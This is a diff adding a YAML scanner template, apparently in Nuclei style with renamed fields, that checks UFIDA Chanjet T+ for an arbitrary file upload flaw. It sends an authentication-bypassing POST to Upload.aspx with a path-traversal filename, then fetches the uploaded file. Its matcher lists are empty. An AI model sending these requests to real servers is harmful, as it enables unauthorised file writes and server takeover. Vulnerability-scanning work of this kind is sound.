@@ -1,0 +1,33 @@
+id: chanjet-tplus-fileupload
+brief:
+    title: UFIDA Chanjet TPluse Upload.aspx - Arbitrary File Upload
+    by: SleepingBag945
+    level: high
+    about: There is an arbitrary file upload vulnerability in the Upload.aspx interface of UFIDA Chanjet TPlus. An attacker can use the preload parameter to bypass authentication to upload files and control t...
+    label:
+        - yonyou
+        - chanjet
+        - upload
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/tplus/SM/SetupAccount/Upload.aspx?preload=1'
+      head:
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuirnbcvo
+      body: |-
+        ------WebKitFormBoundaryuirnbcvo
+        Content-Disposition: form-data; name="File1"; filename="../../../img/login/{{randstr_1}}.jpg"
+        Content-Type: image/jpeg
+
+        {{randstr_2}}
+        ------WebKitFormBoundaryuirnbcvo--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/tplus/img/login/{{randstr_1}}.jpg'
+      head:
+        Accept-Encoding: gzip
+      signs: []
